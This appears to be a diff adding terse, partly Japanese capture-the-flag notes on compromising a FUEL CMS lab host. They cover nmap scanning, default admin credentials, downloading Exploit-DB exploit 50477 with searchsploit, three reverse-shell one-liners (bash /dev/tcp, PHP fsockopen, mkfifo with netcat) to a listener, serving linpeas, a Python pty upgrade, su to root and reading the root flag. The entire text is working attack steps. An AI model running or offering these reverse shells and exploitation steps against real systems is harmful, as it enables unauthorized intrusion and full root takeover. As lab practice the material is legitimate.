@@ -1,0 +1,28 @@
+nmap -sV -oN nmap.log 10.48.149.92
+
+
+To access the FUEL admin, go to:
+http://10.48.149.92/fuel
+User name: admin
+Password: admin (you can and should change this password and admin user information after logging in)
+
+
+Exploit-DBから検索
+searchsploit fuel cms
+
+
+エクスプロイトID: 50477をローカルにダウンロード
+searchsploit -m 50477
+
+
+リバースシェル
+bash -i >& /dev/tcp/192.168.141.239/1234 0>&1
+php -r '$sock=fsockopen("192.168.141.239",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.141.239 1234>/tmp/f
+
+python3 -m http.serverでlinpeas.shを移動
+
+python -c "import pty; pty.spawn('/bin/bash')"
+su root
+mememe
+cat /root/root.txt
